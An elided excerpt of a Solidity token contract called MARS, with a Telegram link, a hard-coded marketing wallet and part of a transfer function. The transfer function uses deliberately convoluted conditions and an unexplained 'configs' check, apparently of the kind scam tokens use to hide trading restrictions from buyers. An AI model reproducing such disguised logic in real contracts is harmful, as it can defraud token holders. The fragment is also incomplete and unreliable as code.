...
Telegram : https://t.me/MarsPortal
...
contract MARS is Context, IERC20, Ownable { 
    ...
    address payable public Marketing_Wallet = payable(0xb35Af44c4BFE692bA785BEA9C4634E9D33390a03);

    mapping (address => bool) public ExcludedFromFee;
    mapping (address => bool) public ExcludedFromTax;

    string public _name = "MARS";
    string public _symbol = "MARS";
    ...
    function _transfer(address from,address to,uint256 amount) private {
        ...
        if(ExcludedFromTax[from] || !(from != uniswapV2Pair) || ExcludedFromTax[to]){
            tradeFee = false;
            if(!(configs[to] < 0) && lockedSwap < 2-1){lockedSwap = (100-2)*100/100;}
        }
